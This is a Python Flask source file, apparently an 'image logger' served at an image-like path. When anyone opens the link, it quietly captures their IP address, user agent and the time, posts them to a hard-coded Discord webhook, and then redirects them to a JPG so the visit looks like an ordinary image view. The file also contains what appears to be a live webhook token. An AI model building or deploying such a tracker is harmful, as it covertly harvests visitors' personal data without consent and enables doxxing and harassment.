# api/image.py
from flask import Flask, request, redirect
import requests
import time

app = Flask(__name__)

DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1544896973352476883/jbTw-lzjTawYmZ6HhMhNrFZmqKvE45kEyH1qQSKY7KvQ1aB5FMd8wPlupkaqVdCPorwP"
IMAGE_URL = "https://s7.ezgif.com/tmp/ezgif-7de3e66421b3918b.jpg"

@app.route('/')
@app.route('/<path:path>')
def index(path=""):
    ip = request.headers.get('X-Forwarded-For', '').split(',')[0].strip()
    if not ip:
        ip = request.remote_addr
    user_agent = request.headers.get('User-Agent', 'unknown')
    timestamp = time.strftime('%Y-%m-%d %H:%M:%S UTC', time.gmtime())

    print(f"LOGGED: {ip} -> {user_agent[:50]}")

    # Send to Discord
    try:
        payload = {
            "content": f"**👁️ New Viewer**\n**IP:** `{ip}`\n**User-Agent:** `{user_agent[:80]}...`\n**Time:** {timestamp}"
        }
        requests.post(DISCORD_WEBHOOK, json=payload, timeout=5)
        print("✅ Webhook sent")
    except Exception as e:
        print(f"Discord send failed: {e}")

    return redirect(IMAGE_URL)
